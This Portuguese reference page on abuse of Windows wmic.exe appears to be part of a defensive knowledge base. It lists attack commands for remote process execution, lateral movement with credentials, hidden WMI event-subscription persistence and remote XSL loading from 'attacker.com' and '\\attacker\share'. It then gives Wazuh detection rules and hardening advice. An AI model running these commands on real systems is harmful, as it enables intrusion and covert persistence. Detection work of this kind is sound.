# wmic.exe

**Plataforma:** Windows (XP até Windows 10/11 — depreciado mas presente)

**Categorias:** Execução de código, Movimentação lateral, Reconhecimento, Persistência

**MITRE ATT&CK:** T1047 (Windows Management Instrumentation), T1021.006 (WMI Remote), T1546.003 (WMI Event Subscription)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Wmic/

---

## O que é o wmic.exe

O wmic.exe é a interface de linha de comando para o Windows Management Instrumentation (WMI), o sistema de gerenciamento e monitoramento do Windows baseado no padrão CIM (Common Information Model). O WMI oferece acesso a praticamente todos os aspectos do sistema operacional: processos, serviços, hardware, rede, registro, e muito mais.

O wmic.exe foi marcado como depreciado pela Microsoft a partir do Windows 10 versão 21H1, mas permanece presente e funcional em virtualmente todos os sistemas Windows em produção. Sua substituição oficial é o módulo `CimCmdlets` do PowerShell.

---

## Por que atacantes usam o wmic.exe

O wmic.exe é valioso para atacantes por razões distintas das outras ferramentas desta lista. Seu diferencial está na **execução remota**: o wmic pode executar processos em máquinas remotas via WMI sem necessidade de PSExec ou outras ferramentas de movimentação lateral, usando apenas o protocolo DCOM que frequentemente está permitido na rede interna.

Além disso, o WMI suporta persistência via event subscriptions — uma técnica avançada que cria triggers invisíveis no sistema que executam código em resposta a eventos do sistema, sem criar entradas visíveis no registro de Run keys ou tarefas agendadas.

---

## Técnicas de abuso

### Execução local de processo

```cmd
:: Executar processo via WMI localmente
wmic process call create "cmd.exe /c whoami > C:\temp\out.txt"

:: Executar payload
wmic process call create "C:\Users\Public\payload.exe"

:: Executar PowerShell com payload encoded
wmic process call create "powershell.exe -enc <base64_payload>"

:: Executar de forma silenciosa (sem janela)
wmic process call create "cmd.exe /c start /B payload.exe"
```

### Execução remota (movimentação lateral)

Esta é a capacidade mais crítica do wmic do ponto de vista de movimentação lateral:

```cmd
:: Executar comando em máquina remota com credenciais atuais
wmic /node:192.168.1.100 process call create "cmd.exe /c whoami"

:: Com credenciais explícitas
wmic /node:192.168.1.100 /user:DOMAIN\Administrator /password:Senha123 process call create "cmd.exe /c whoami"

:: Executar em múltiplos hosts (lista separada por vírgula)
wmic /node:"192.168.1.100,192.168.1.101,192.168.1.102" process call create "cmd.exe /c net user"

:: Copiar e executar payload via compartilhamento
wmic /node:192.168.1.100 process call create "cmd.exe /c copy \\attacker\share\payload.exe C:\Windows\Temp\ && C:\Windows\Temp\payload.exe"
```

A execução remota via wmic usa o protocolo DCOM sobre RPC, que frequentemente está permitido em redes internas corporativas mesmo quando SMB está bloqueado entre segmentos.

### Reconhecimento do sistema

```cmd
:: Listar processos em execução
wmic process get caption,commandline,processid

:: Informações do sistema
wmic computersystem get name,domain,username,model

:: Usuários logados
wmic computersystem get username

:: Produtos instalados (útil para identificar AV/EDR)
wmic product get name,version

:: Serviços em execução
wmic service where "state='running'" get name,displayname,pathname

:: Shares de rede
wmic share get name,path,type

:: Informações de rede
wmic nicconfig get ipaddress,macaddress,description

:: Listar processos remotamente
wmic /node:192.168.1.100 process get caption,processid
```

### Persistência via WMI Event Subscription

Esta é uma das técnicas de persistência mais furtivas disponíveis no Windows. Cria um mecanismo de execução que sobrevive a reinicializações e não aparece no registro de Run keys nem em tarefas agendadas visíveis.

```powershell
# Via PowerShell (mais completo que o wmic para esta finalidade)

# Criar event filter (gatilho — neste caso, a cada 60 segundos)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name = "WindowsUpdate"
  EventNamespace = "root\cimv2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
}

# Criar consumer (o que executar quando o evento ocorrer)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name = "WindowsUpdate"
  CommandLineTemplate = "powershell.exe -enc <payload>"
}

# Criar binding (conectar filter ao consumer)
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter
  Consumer = $consumer
}
```

Via wmic diretamente:

```cmd
:: Criar event filter via wmic
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="WindowsUpdate", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

:: Criar consumer
wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WindowsUpdate", CommandLineTemplate="cmd.exe /c powershell.exe -enc <payload>"

:: Criar binding
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WindowsUpdate\"", Consumer="CommandLineEventConsumer.Name=\"WindowsUpdate\""
```

### Execução de XSL (técnica de bypass)

```cmd
:: Executar código via arquivo XSL (similar ao Squiblydoo do regsvr32)
wmic process get brief /format:"http://attacker.com/payload.xsl"

:: Via arquivo XSL local
wmic process get brief /format:"C:\Users\Public\payload.xsl"
```

O arquivo XSL pode conter JScript ou VBScript com acesso total ao sistema via ActiveXObject.

---

## Técnicas de bypass e evasão

### Uso de alias WMI

```cmd
:: O wmic suporta aliases que são menos monitorados
wmic alias call create "cmd.exe /c payload.exe"
```

### Execução via COM Object (sem chamar wmic.exe diretamente)

```powershell
# Via PowerShell sem wmic.exe
$wmi = [wmiclass]"\\.\root\cimv2:Win32_Process"
$wmi.Create("cmd.exe /c whoami")

# Remotamente
$wmi = [wmiclass]"\\192.168.1.100\root\cimv2:Win32_Process"
$wmi.Create("cmd.exe /c whoami")
```

Essa técnica usa o mesmo protocolo WMI mas não invoca o binário wmic.exe, contornando detecções baseadas em nome de processo.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- wmic com `process call create` — execução de processo via WMI
- wmic com `/node:` apontando para IP ou hostname remoto — movimentação lateral
- wmic com `/format:http` — execução de XSL remoto
- Criação de objetos WMI no namespace `root\subscription` — persistência via event subscription
- Processo filho de WmiPrvSE.exe (o provedor WMI) — execução remota recebida

**Indicadores de média relevância:**

- wmic consultando produtos instalados (reconhecimento de AV/EDR)
- wmic com `/namespace:\\root\subscription` — manipulação de event subscriptions

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<!-- wmic com process call create -->
<rule id="100325" level="13">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)wmic\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)process\s+call\s+create</field>
  <description>wmic.exe executando processo via WMI — possivel execucao de payload ou movimentacao lateral</description>
  <mitre>
    <id>T1047</id>
  </mitre>
</rule>

<!-- wmic com /node: remoto -->
<rule id="100326" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)wmic\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/node:</field>
  <description>wmic.exe com node remoto — possivel movimentacao lateral via WMI</description>
  <mitre>
    <id>T1021.006</id>
  </mitre>
</rule>

<!-- wmic com /format: remoto (XSL execution) -->
<rule id="100327" level="15">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)wmic\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/format\s*:.*https?://</field>
  <description>wmic.exe carregando XSL remoto — execucao de codigo via proxy WMI</description>
  <mitre>
    <id>T1047</id>
  </mitre>
</rule>

<!-- Processo filho de WmiPrvSE.exe — execução remota via WMI recebida -->
<rule id="100328" level="14">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)WmiPrvSE\.exe$</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(cmd|powershell|wscript|cscript|mshta|rundll32)\.exe$</field>
  <description>Processo suspeito iniciado como filho de WmiPrvSE.exe — possivel execucao remota recebida via WMI</description>
  <mitre>
    <id>T1047</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Ferramentas de gerenciamento de TI:** SCCM, SCOM, Altiris e outras ferramentas de gerenciamento usam WMI extensivamente para inventário e execução remota. Filtre pelo usuário de serviço dessas ferramentas e pelos destinos conhecidos.

**Scripts de administração:** administradores usam wmic para inventário de hardware e software. O uso de `process call create` ou `/node:` remotos por administradores em janelas de manutenção deve ser documentado e filtrado.

---

## Proteção e controles defensivos

**Desabilitar wmic.exe via AppLocker:** na maioria dos ambientes de produção, o wmic pode ser desabilitado para usuários comuns sem impacto operacional. A Microsoft está depreciando ativamente o wmic, portanto migrar para alternativas PowerShell já é uma necessidade.

**Monitorar namespace WMI root\subscription:** Qualquer nova entry criada nesse namespace deve gerar alerta. O Wazuh pode monitorar Event ID 5861 (WMI Activity Operational) para criação de event subscriptions.

**Restringir DCOM de saída para estações de trabalho:** regras de firewall que bloqueiam conexões DCOM (porta 135 e portas dinâmicas) entre estações de trabalho eliminam o vetor de movimentação lateral via WMI, sem impactar o gerenciamento centralizado que parte de servidores de gerenciamento específicos.

---

## Referências

- LOLBAS — wmic.exe: https://lolbas-project.github.io/lolbas/Binaries/Wmic/
- MITRE ATT&CK T1047: https://attack.mitre.org/techniques/T1047/
- MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/
